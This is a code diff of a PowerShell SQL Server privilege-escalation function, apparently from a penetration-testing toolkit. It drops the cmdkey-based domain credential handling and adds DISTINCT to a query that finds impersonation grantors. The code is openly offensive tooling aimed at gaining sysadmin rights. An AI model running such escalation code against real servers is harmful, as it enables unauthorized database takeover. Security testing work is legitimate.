@@ -100,39 +100,22 @@ function Invoke-SqlServer-Escalate-ExecuteAs
     # Create fun connection object
     $conn = New-Object System.Data.SqlClient.SqlConnection
     
-    # Check for domain credentials
-    if($SqlUser){
-        $DomainUserCheck = $SqlUser.Contains("\")
-    }
-
     # Set authentication type and create connection string
-    if($SqlUser -and $SqlPass -and !$DomainUserCheck){
+    if($SqlUser){
     
         # SQL login / alternative domain credentials
          Write-Output "[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser..."
         $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
         [string]$ConnectUser = $SqlUser
     }else{
-
-        # Create credentials management entry if a domain user is used
-        if ($DomainUserCheck -and (Test-Path  ("C:\Windows\System32\cmdkey.exe"))){   
-     		
-            Write-Output "[*] Attempting to authenticate to $SqlServerInstance with domain account $SqlUser..."
-            $SqlServerInstanceCol = $SqlServerInstance -replace ',', ':'
-	    $CredManCmd = 'cmdkey /add:'+$SqlServerInstanceCol+' /user:'+$SqlUser+' /pass:'+$SqlPass 
-            Write-Verbose "Command: $CredManCmd"
-            $ExecManCmd = invoke-expression $CredManCmd
-        }else{
-
-            Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
-        }
-
+            
         # Trusted connection
+        Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
         $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
         $UserDomain = [Environment]::UserDomainName
         $Username = [Environment]::UserName
-        $ConnectUser = "$UserDomain\$Username"
-    }
+        $ConnectUser = "$UserDomain\$Username"                    
+     }
 
 
     # -----------------------------------------------
@@ -146,13 +129,6 @@ function Invoke-SqlServer-Escalate-ExecuteAs
         $ErrorMessage = $_.Exception.Message
         Write-Host "[*] Connection failed" -foreground "red"
         Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
-
-        # Clean up credentials manager entry
-        if ($DomainUserCheck){
-            $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
-            Write-Verbose "Command: $CredManDel"   
-            $ExecManDel = invoke-expression $CredManDel
-        }  
         Break
     }
 
@@ -182,13 +158,6 @@ function Invoke-SqlServer-Escalate-ExecuteAs
         if ($Checksysadmin -ne 0){
                 Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
                 Write-Host "[*] All Done."
-
-                # Clean up credentials manager entry
-                if ($DomainUserCheck){
-                    $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
-                    Write-Verbose "Command: $CredManDel"   
-                    $ExecManDel = invoke-expression $CredManDel
-                }  
                 Break             
         }
     }
@@ -207,7 +176,7 @@ function Invoke-SqlServer-Escalate-ExecuteAs
     $conn.Open()
 
     # Setup query
-    $QueryDatabases = "SELECT b.name
+    $QueryDatabases = "SELECT DISTINCT b.name
     FROM sys.server_permissions a
     INNER JOIN sys.server_principals b
     ON a.grantor_principal_id = b.principal_id 
@@ -363,13 +332,4 @@ function Invoke-SqlServer-Escalate-ExecuteAs
          Write-Host "[*] All done." 
     }  
     
-    # -----------------------------------------------
-    # Clean up credentials manager entry
-    # -----------------------------------------------
-    if ($DomainUserCheck){
-        $DomainUserCheck
-        $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
-        Write-Verbose "Command: $CredManDel"   
-        $ExecManDel = invoke-expression $CredManDel
-    }  	
 }
